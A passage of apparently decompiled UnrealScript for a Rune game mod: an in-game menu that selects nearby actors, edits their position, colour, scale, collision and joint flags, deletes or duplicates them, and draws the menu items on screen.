		if (ClosestParticleSystem != none)
		{
			A_v6593 = ClosestParticleSystem;
		}
		else
		{
			Owner.ClientMessage("Didn't find any particlesystem around.");
		}
	}

	// Find closest effect
	if (CommandName == "closesteffect")
	{
		ClosestDistance = 1000000000.0;
		ClosestActor = none;
		foreach Owner.Level.AllActors(Class'Engine.Actor', TempActor)
		{
			if (TempActor.IsA('Effects'))
			{
				if (!TempActor.IsA('SarkEyeRagnarRed') && !TempActor.IsA('SarkRagnarEyeFlameRed'))
				{
					TempDistance = VSize(TempActor.Location - Owner.Location);
					if ((TempDistance < ClosestDistance) && TempActor != A_v6593)
					{
						ClosestDistance = TempDistance;
						ClosestActor = TempActor;
					}
				}
			}
		}
		if (ClosestActor != none)
		{
			A_v6593 = ClosestActor;
		}
		else
		{
			Owner.ClientMessage("Didn't find any effect.");
		}
	}

	// Select self
	if (CommandName == "selectme")
	{
		if (Owner != none)
		{
			A_v6593 = Owner;
		}
	}

	// Get location and rotation
	if (CommandName == "getlocrot")
	{
		if (A_v6593 != none)
		{
			Owner.ClientMessage(string(A_v6593) @ ":");
			Owner.ClientMessage("Location: " $ string(A_v6593.Location));
			Owner.ClientMessage("Rotation: " $ string(A_v6593.Rotation));
		}
		else
		{
			Owner.ClientMessage("Select an object first.");
		}
	}

	// Find closest pawn
	if (CommandName == "closestpawn")
	{
		ClosestDistance = 1000000000.0;
		ClosestPawn = none;
		foreach Owner.Level.AllActors(Class'Engine.Pawn', TempPawn)
		{
			if (PlayerPawn(TempPawn) != Owner)
			{
				TempDistance = VSize(TempPawn.Location - Owner.Location);
				if ((TempDistance < ClosestDistance) && TempPawn != A_v6593)
				{
					ClosestDistance = TempDistance;
					ClosestPawn = TempPawn;
				}
			}
		}
		if (ClosestPawn != none)
		{
			A_v6593 = ClosestPawn;
		}
		else
		{
			Owner.ClientMessage("Didn't find any pawn.");
		}
	}

	// Find closest pickup
	if (CommandName == "closestpickup")
	{
		ClosestDistance = 1000000000.0;
		ClosestInventory = none;
		foreach Owner.Level.AllActors(Class'Engine.Inventory', TempInventory)
		{
			if ((TempInventory != Owner.Weapon) && TempInventory.Owner != Owner)
			{
				TempDistance = VSize(TempInventory.Location - Owner.Location);
				if ((TempDistance < ClosestDistance) && TempInventory != A_v6593)
				{
					ClosestDistance = TempDistance;
					ClosestInventory = TempInventory;
				}
			}
		}
		if (ClosestInventory != none)
		{
			A_v6593 = ClosestInventory;
		}
		else
		{
			Owner.ClientMessage("Didn't find any pickups.");
		}
	}

	// Manipulate selected actor
	if (A_v6593 != none)
	{
		// Rotation commands (only if not PlayerPawn)
		if (!A_v6593.IsA('PlayerPawn'))
		{
			if (CommandName == "rotate pitch")
			{
				ZRunePlayer(Owner).sMove(RotationIncrement, "pitch", A_v6593);
			}
			if (CommandName == "rotate roll")
			{
				ZRunePlayer(Owner).sMove(RotationIncrement, "roll", A_v6593);
			}
			if (CommandName == "rotate yaw")
			{
				ZRunePlayer(Owner).sMove(RotationIncrement, "yaw", A_v6593);
			}
		}

		// Position commands
		if (CommandName == "position x")
		{
			ZRunePlayer(Owner).sMove(PositionIncrement, "x", A_v6593);
		}
		if (CommandName == "position y")
		{
			ZRunePlayer(Owner).sMove(PositionIncrement, "y", A_v6593);
		}
		if (CommandName == "position z")
		{
			ZRunePlayer(Owner).sMove(PositionIncrement, "z", A_v6593);
		}

		// Color adjustments
		if (CommandName == "color r")
		{
			if (IsIncrement)
			{
				TempInt = int(A_v6593.DesiredColorAdjust.X + 1);
			}
			else
			{
				TempInt = int(A_v6593.DesiredColorAdjust.X - 1);
			}
			if (TempInt > 255)
			{
				TempInt = 0;
			}
			if (TempInt < 0)
			{
				TempInt = 255;
			}
			ZRunePlayer(Owner).sMove(TempInt, "r", A_v6593);
		}
		if (CommandName == "color g")
		{
			if (IsIncrement)
			{
				TempInt = int(A_v6593.DesiredColorAdjust.Y + 1);
			}
			else
			{
				TempInt = int(A_v6593.DesiredColorAdjust.Y - 1);
			}
			if (TempInt > 255)
			{
				TempInt = 0;
			}
			if (TempInt < 0)
			{
				TempInt = 255;
			}
			ZRunePlayer(Owner).sMove(TempInt, "g", A_v6593);
		}
		if (CommandName == "color b")
		{
			if (IsIncrement)
			{
				TempInt = int(A_v6593.DesiredColorAdjust.Z + 1);
			}
			else
			{
				TempInt = int(A_v6593.DesiredColorAdjust.Z - 1);
			}
			if (TempInt > 255)
			{
				TempInt = 0;
			}
			if (TempInt < 0)
			{
				TempInt = 255;
			}
			ZRunePlayer(Owner).sMove(TempInt, "b", A_v6593);
		}

		// Fatness adjustment
		if (CommandName == "fatness")
		{
			if (IsIncrement)
			{
				TempInt = int(A_v6593.DesiredFatness) + 1;
			}
			else
			{
				TempInt = int(A_v6593.DesiredFatness) - 1;
			}
			if (TempInt > 255)
			{
				TempInt = 0;
			}
			if (TempInt < 0)
			{
				TempInt = 255;
			}
			ZRunePlayer(Owner).sMove(TempInt, "fatness", A_v6593);
		}

		// Collision adjustments
		if (CommandName == "collisionheight")
		{
			if (IsIncrement)
			{
				TempInt = int(A_v6593.CollisionHeight + 1);
			}
			else
			{
				TempInt = int(A_v6593.CollisionHeight - 1);
			}
			if (TempInt > 512)
			{
				TempInt = 0;
			}
			if (TempInt < 0)
			{
				TempInt = 0;
			}
			ZRunePlayer(Owner).sMove(TempInt, "collisionheight", A_v6593);
		}
		if (CommandName == "collisionradius")
		{
			if (IsIncrement)
			{
				TempInt = int(A_v6593.CollisionRadius + 1);
			}
			else
			{
				TempInt = int(A_v6593.CollisionRadius - 1);
			}
			if (TempInt > 512)
			{
				TempInt = 0;
			}
			if (TempInt < 0)
			{
				TempInt = 0;
			}
			ZRunePlayer(Owner).sMove(TempInt, "collisionradius", A_v6593);
		}

		// Style adjustment
		if (CommandName == "style")
		{
			if (IsIncrement)
			{
				TempInt = int(A_v6593.Style) + 1;
			}
			else
			{
				TempInt = int(A_v6593.Style) - 1;
			}
			if (TempInt > 5)
			{
				TempInt = 1;
			}
			if (TempInt < 1)
			{
				TempInt = 5;
			}
			ZRunePlayer(Owner).sMove(TempInt, "style", A_v6593);
		}

		// Alpha scale adjustment
		if (CommandName ~= "alphascale")
		{
			if (IsIncrement)
			{
				TempFloat = A_v6593.AlphaScale + 0.01;
			}
			else
			{
				TempFloat = A_v6593.AlphaScale - 0.01;
			}
			if (TempFloat < 0.01)
			{
				TempFloat = 0.01;
			}
			if (A_v6593 != none)
			{
				ZRunePlayer(Owner).sMove(TempFloat, "alphascale", A_v6593);
			}
		}

		// Draw scale adjustment
		if (CommandName == "drawscale")
		{
			if (IsIncrement)
			{
				TempFloat = A_v6593.DrawScale + 0.1;
			}
			else
			{
				TempFloat = A_v6593.DrawScale - 0.1;
			}
			if (TempFloat < 0.1)
			{
				TempFloat = 0.1;
			}
			if (A_v6593 != none)
			{
				ZRunePlayer(Owner).sMove(TempFloat, "drawscale", A_v6593);
			}
		}

		// Toggle destroyable
		if (CommandName == "destroyable")
		{
			if (A_v6593.IsA('DecorationRune'))
			{
				DecorationRune(A_v6593).bDestroyable = !DecorationRune(A_v6593).bDestroyable;
			}
			if (A_v6593 != none)
			{
				ZRunePlayer(Owner).sMove(TempFloat, "destroyable", A_v6593);
			}
		}

		// Toggle static
		if (CommandName == "bstatic")
		{
			ZRunePlayer(Owner).sMove(TempFloat, "bstatic", A_v6593);
		}

		// Toggle stasis
		if (CommandName == "bstasis")
		{
			ZRunePlayer(Owner).sMove(TempFloat, "bstasis", A_v6593);
		}

		// Toggle no delete
		if (CommandName == "bnodelete")
		{
			ZRunePlayer(Owner).sMove(TempFloat, "bnodelete", A_v6593);
		}

		// Duplicate (only if not PlayerPawn)
		if (!A_v6593.IsA('PlayerPawn'))
		{
			if (CommandName == "duplicate")
			{
				B_v6590 = true;
				ZRunePlayer(Owner).sMove(TempInt, "duplicate", A_v6593);
			}
		}

		// Delete
		if (CommandName == "delete")
		{
			ZRunePlayer(Owner).kill(string(A_v6593));
		}

		// Handle skeletal flags
		if ((GetDelimitedPart(CommandName, 1)) ~= "skelflag")
		{
			TempInt = int(GetDelimitedPart(CommandName, 2));
			if (IsIncrement)
			{
				TempInt = A_v6593.SkelGroupFlags[TempInt];
				if (TempInt == 0)
				{
					TempInt = 1;
				}
				else
				{
					if (TempInt > 134217728)
					{
						TempInt = 0;
					}
					else
					{
						TempInt = TempInt * 2;
					}
				}
			}
			else
			{
				TempInt = A_v6593.SkelGroupFlags[TempInt];
				if (TempInt == 0)
				{
					TempInt = 134217728;
				}
				else
				{
					if (TempInt == 1)
					{
						TempInt = 0;
					}
					else
					{
						if (TempInt > 1)
						{
							TempInt = TempInt / 2;
						}
					}
				}
			}
			ZRunePlayer(Owner).sMove(TempInt, "setflag " $ string(TempInt), A_v6593);
		}

		// Handle joint flags
		if ((GetDelimitedPart(CommandName, 1)) ~= "jointflag")
		{
			TempInt = int(GetDelimitedPart(CommandName, 2));
			if (IsIncrement)
			{
				TempInt = int(A_v6593.JointFlags[TempInt]);
				if (TempInt == 0)
				{
					TempInt = 1;
				}
				else
				{
					if (TempInt > 128)
					{
						TempInt = 0;
					}
					else
					{
						TempInt = TempInt * 2;
					}
				}
			}
			else
			{
				TempInt = int(A_v6593.JointFlags[TempInt]);
				if (TempInt == 0)
				{
					TempInt = 128;
				}
				else
				{
					if (TempInt == 1)
					{
						TempInt = 0;
					}
					else
					{
						if (TempInt > 1)
						{
							TempInt = TempInt / 2;
						}
					}
				}
			}
			ZRunePlayer(Owner).sMove(TempInt, "setjointflag " $ string(TempInt), A_v6593);
		}

		// Joint manipulation
		if (CommandName ~= "jointman")
		{
			if (IsIncrement)
			{
				TempInt = int(A_v6593.JointFlags[whichJoint]) + 1;
			}
			else
			{
				TempInt = int(A_v6593.JointFlags[whichJoint]) - 1;
			}
			if (TempInt > 255)
			{
				TempInt = 0;
			}
			if (TempInt < 0)
			{
				TempInt = 255;
			}
			ZRunePlayer(Owner).sMove(TempInt, "setjointflag " $ string(whichJoint), A_v6593);
		}
		if (CommandName ~= "jointx")
		{
			TempVector.X = jointAdd;
			TempVector.Y = 0.0;
			TempVector.Z = 0.0;
			ZRunePlayer(Owner).sMove(whichJoint, "jointx", A_v6593, TempVector);
		}
		if (CommandName ~= "jointy")
		{
			TempVector.X = 0.0;
			TempVector.Y = jointAdd;
			TempVector.Z = 0.0;
			ZRunePlayer(Owner).sMove(whichJoint, "jointy", A_v6593, TempVector);
		}
		if (CommandName ~= "jointz")
		{
			TempVector.X = 0.0;
			TempVector.Y = 0.0;
			TempVector.Z = jointAdd;
			ZRunePlayer(Owner).sMove(whichJoint, "jointz", A_v6593, TempVector);
		}
	}

	// Admin login
	if (CommandName == "adminlogin")
	{
		TypedStr = "AdminLogin ";
		INT_v6678 = Len(TypedStr);
		bNoStuff = true;
		INT_v6715 = 2;
		bTyping = true;
		Viewport.Actor.Typing(bTyping);
	}

	// Cheat command
	if (CommandName == "cheatplease")
	{
		Owner.ConsoleCommand("cheatplease");
	}
	return;
}

// Suggested name: DrawMenuItem
function DrawMenuItem(coerce string Text, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item on the canvas.

    Canvas.Font = Canvas.MedFont;
    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);
    Canvas.DrawColor = MakeColor(255, 255, 255);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    Canvas.DrawText(FormatCurrentDate("/"));
    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawMenuItemNoSlash
function eqL_vxv_2406(coerce string Text, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item on the canvas, similar to DrawMenuItem, but without the trailing slash.

    Canvas.Font = Canvas.MedFont;
    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);
    Canvas.DrawColor = MakeColor(255, 255, 255);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawMenuText
function DrawMenuText(coerce string Text, float Value, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws text on the canvas, typically for menu items.

    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);
    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawMenuCommandText
function DrawMenuCommandText(coerce string Text, float Value, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws command text on the canvas, typically for menu items.

    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);
    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawMenuValueItem
function DrawMenuValueItem(coerce string Text, float Value, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item with a value.
    // If the value is 0, it displays "disabled" in green; otherwise, it displays the integer value.

    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    Canvas.DrawColor = MakeColor(255, 255, 255);

    if (Value == 0.0)
    {
        Canvas.DrawColor = MakeColor(0, 255, 0);
        Canvas.DrawText("disabled");
    }
    else
    {
        Canvas.DrawText(string(int(Value)));
    }

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawActorTagMenuItem
function DrawActorTagMenuItem(coerce string Text, float Value, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item that displays the Tag property of a selected actor (A_v6593).

    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    Canvas.DrawColor = MakeColor(255, 255, 255);

    if (A_v6593 != none)
    {
        Canvas.DrawText(string(A_v6593.Tag));
    }
    else
    {
        Canvas.DrawText("/");
    }

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawActorEventMenuItem
function DrawActorEventMenuItem(coerce string Text, float Value, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item that displays the Event property of a selected actor (A_v6593).

    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    Canvas.DrawColor = MakeColor(255, 255, 255);

    if (A_v6593 != none)
    {
        Canvas.DrawText(string(A_v6593.Event));
    }
    else
    {
        Canvas.DrawText("/");
    }

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawDestroyableMenuItem
function DrawDestroyableMenuItem(coerce string Text, float Value, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item that displays whether a selected DecorationRune actor is destroyable.

    Canvas.Font = Canvas.MedFont;
    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (DecorationRune(A_v6593) != none)
    {
        if (bigFontMenu && ItemIndex == INT_v6448)
        {
            Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
        }

        if (DecorationRune(A_v6593).bDestroyable)
        {
            Canvas.DrawColor = MakeColor(0, 255, 0);
            Canvas.DrawText("yes");
        }
        else
        {
            Canvas.DrawColor = MakeColor(255, 0, 0);
            Canvas.DrawText("no");
        }

        INT_v3204 += (12 + menuGap);
    }
}

// Suggested name: DrawStaticMenuItem
function DrawStaticMenuItem(coerce string Text, float Value, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item that displays whether a selected actor is static.

    Canvas.Font = Canvas.MedFont;
    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (A_v6593 != none)
    {
        if (bigFontMenu && ItemIndex == INT_v6448)
        {
            Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
        }

        if (A_v6593.bStatic)
        {
            Canvas.DrawColor = MakeColor(0, 255, 0);
            Canvas.DrawText("yes");
        }
        else
        {
            Canvas.DrawColor = MakeColor(255, 0, 0);
            Canvas.DrawText("no");
        }

        INT_v3204 += (12 + menuGap);
    }
}

// Suggested name: DrawNoDeleteMenuItem
function DrawNoDeleteMenuItem(coerce string Text, float Value, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item that displays whether a selected actor can be deleted.

    Canvas.Font = Canvas.MedFont;
    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (A_v6593 != none)
    {
        if (bigFontMenu && ItemIndex == INT_v6448)
        {
            Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
        }

        if (A_v6593.bNoDelete)
        {
            Canvas.DrawColor = MakeColor(0, 255, 0);
            Canvas.DrawText("yes");
        }
        else
        {
            Canvas.DrawColor = MakeColor(255, 0, 0);
            Canvas.DrawText("no");
        }

        INT_v3204 += (12 + menuGap);
    }
}

// Suggested name: DrawStasisMenuItem
function DrawStasisMenuItem(coerce string Text, float Value, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item that displays whether a selected actor is in stasis.

    Canvas.Font = Canvas.MedFont;
    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (A_v6593 != none)
    {
        if (bigFontMenu && ItemIndex == INT_v6448)
        {
            Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
        }

        if (A_v6593.bStasis)
        {
            Canvas.DrawColor = MakeColor(0, 255, 0);
            Canvas.DrawText("yes");
        }
        else
        {
            Canvas.DrawColor = MakeColor(255, 0, 0);
            Canvas.DrawText("no");
        }

        INT_v3204 += (12 + menuGap);
    }
}

// Suggested name: DrawDrawScaleMenuItem
function DrawDrawScaleMenuItem(coerce string Text, float Value, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item that displays the DrawScale property of a selected actor.

    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    Canvas.DrawColor = MakeColor(255, 255, 255);

    if (A_v6593 != none)
    {
        Canvas.DrawText(string(A_v6593.DrawScale));
    }
    else
    {
        Canvas.DrawText("/");
    }

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawAlphaScaleMenuItem
function DrawAlphaScaleMenuItem(coerce string Text, float Value, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item that displays the AlphaScale property of a selected actor.

    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    Canvas.DrawColor = MakeColor(255, 255, 255);

    if (A_v6593 != none)
    {
        Canvas.DrawText(string(A_v6593.AlphaScale));
    }
    else
    {
        Canvas.DrawText("/");
    }

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawSkelGroupFlagMenuItem
function DrawSkelGroupFlagMenuItem(coerce string Text, float FlagIndex, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item that displays the skeletal group flag of a selected actor.

    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    Canvas.DrawColor = MakeColor(255, 255, 255);
    Canvas.DrawText(GetPolyFlagName(int(A_v6593.SkelGroupFlags[int(FlagIndex)])));

    INT_v3204 += (12 + menuGap);
}

// Suggested name: DrawJointFlagMenuItem
function DrawJointFlagMenuItem(coerce string Text, float FlagIndex, bool bSelected, int ItemIndex, Canvas Canvas)
{
    // This function draws a menu item that displays the joint flag of a selected actor.

    local string JointName;

    JointName = A_v6593.GetJointName(int(FlagIndex));
    Canvas.SetPos(float(INT_v3203), float(INT_v3204));

    if (bigFontMenu)
    {
        if (ItemIndex == INT_v6448)
        {
            Canvas.Font = Canvas.BigFont;
            Canvas.SetPos(float(INT_v3203), float(INT_v3204 - bigfontGap));
        }
        else
        {
            Canvas.Font = Canvas.MedFont;
        }
    }

    if (ItemIndex == INT_v6448)
    {
        Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
    }
    else
    {
        Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
    }

    Canvas.DrawText(Text @ JointName);

    if (bigFontMenu && ItemIndex == INT_v6448)
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204 - bigfontGap));
    }
    else
    {
        Canvas.SetPos(float(INT_v3203 + functionDist), float(INT_v3204));
    }

    Canvas.DrawColor = MakeColor(255, 255, 255);
    Canvas.DrawText(GetJointFlagString(int(A_v6593.JointFlags[int(FlagIndex)])));

    INT_v3204 += (12 + menuGap);
}

// Suggested name: GetJointFlagString
function string GetJointFlagString(int JointFlag)
{
    // This function converts an integer joint flag into a descriptive string.

    switch (JointFlag)
    {
        case 0: return "NONE" @ string(JointFlag);
        case 1: return "JOINT_FLAG_BLENDJOINT" @ string(JointFlag);
        case 2: return "JOINT_FLAG_ACCELERATIVE" @ string(JointFlag);
        case 4: return "JOINT_FLAG_SPRINGPOINT" @ string(JointFlag);
        case 8: return "JOINT_FLAG_ANCHORED" @ string(JointFlag);
        case 16: return "JOINT_FLAG_COLLISION" @ string(JointFlag);
        case 32: return "JOINT_FLAG_REMOVEABLE" @ string(JointFlag);
        case 64: return "JOINT_FLAG_ATTACHPOINT" @ string(JointFlag);
        case 128: return "JOINT_FLAG_FREEPOINT" @ string(JointFlag);
        default: return "MULTIPLE: " $ string(JointFlag);
